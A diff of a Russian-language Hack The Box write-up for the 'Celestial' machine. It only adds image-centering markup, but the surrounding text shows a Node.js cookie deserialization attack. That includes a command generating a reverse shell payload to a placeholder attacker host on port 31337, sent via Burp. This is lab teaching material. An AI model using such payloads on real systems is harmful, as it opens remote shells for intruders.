@@ -85,10 +85,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Ради интереса посмотрим, что скажет браузер. При загрузке страницы в первый раз нас ждет просто сухой циничный маркер пустоты и безысходности, обличенный в жирные цифры **4**, **0**, **4**:
 
 [![port3000-browser-1.png]({{ "/img/htb/boxes/celestial/port3000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-browser-1.png" | relative_url }})
+{: .center-image}
 
 Если быть настойчивее и обновить страничку, нас встретит очень ценное замечание:
 
 [![port3000-browser-2.png]({{ "/img/htb/boxes/celestial/port3000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-browser-2.png" | relative_url }})
+{: .center-image}
 
 Что-то здесь не так, потому что `2 + 2 is 4`, это я точно помню... Будем смотреть на запрос.
 
@@ -96,6 +98,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Перехватим запрос и посмотрим, что под капотом:
 
 [![port3000-burp-1.png]({{ "/img/htb/boxes/celestial/port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-burp-1.png" | relative_url }})
+{: .center-image}
 
 Cookie с профилем. Это объясняет, почему в первый раз пришло сообщение об ошибке (первый запрос был без печенек). Посмотрим, что представляет из себя значение профиля:
 ```text
@@ -158,6 +161,7 @@ root@kali:~# python node_shell.py -h <LHOST> -p 31337 -r -e -o
 Переводим в base64 и отправляем в Burp (не забыв при этом поднять слушателя на фоне на 31337 порт):
 
 [![port3000-burp-2.png]({{ "/img/htb/boxes/celestial/port3000-burp-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-burp-2.png" | relative_url }})
+{: .center-image}
 
 # Внутри машины
 А тем временем:
